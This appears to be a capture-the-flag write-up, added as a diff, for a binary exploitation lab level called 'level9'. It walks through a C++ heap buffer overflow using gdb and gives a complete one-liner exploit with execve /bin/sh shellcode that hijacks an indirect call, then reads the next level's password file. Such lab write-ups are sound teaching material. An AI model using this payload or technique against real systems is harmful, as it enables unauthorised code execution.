@@ -1,0 +1,52 @@
+level9 doesn't seem to do anything at first sight.
+
+With gdb, when inspecting variables and functions, it's obvious this is C++, not simple C...
+Alright. First thing we see is, there's a class called N. It contains operator overloads
+for + and -, and a setAnnotation function that does a memcpy on a string and stores it inside
+a variable of 100 bytes.
+The main creates two N variables, initialising them with 5 and 6. Then calls the setAnnotation
+of the first N on argv[1].
+There's no call to /bin/sh anywhere, so I'll have to find a shellcode to execute.
+
+[memcpy] is overflowable. After searching for a bit, I realise that since the beginning, instead
+of testing manually I could have used https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+to generate a pattern and directly find the offset.
+
+(gdb) >r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
+[segfault at 0x08048682]
+
+In the main, 0x08048682 is the program trying to dereference eax.
+
+(gdb) >info register
+eax 0x41366441 [...]
+
+I enter 0x41366441 on the website and it tells me the offset is 108. Nice. I could have used that earlier.
+The program dereferences eax, stores it in edx and calls edx later. The main goal here will probably have to be
+to change the call to edx, so it calls what we want instead.
+
+This is the shellcode we're going to use:
+	
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+found on http://shell-storm.org/shellcode/files/shellcode-811.php, courtesy of
+https://www.0x0ff.info/2015/buffer-overflow-gdb-part-3/
+
+I'll put a breakpoint at <main + 136>, i.e. right after the call to setAnnotation, just to be sure
+about exactly what is going on.
+
+(gdb) >b *0x0804867c
+(gdb) >r 'test'
+Breakpoint 1, 0x0804867c in main
+(gdb) >x/s $eax
+0x0804a00c:  'test'
+
+So the buffer is located exactly at 0x0804a00c.
+Here's how we're going to proceed:
+
+>./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'X'*76 + '\x0c\xa0\x04\x08'")
+
+The program, when trying to access edx, will jump back to the beginning of the string we wrote. The address there
+points litterally to 4 bytes later, the beginning of our shellcode.
+Let's give it a try!
+
+$>cd ../bonus0
+$>cat .pass
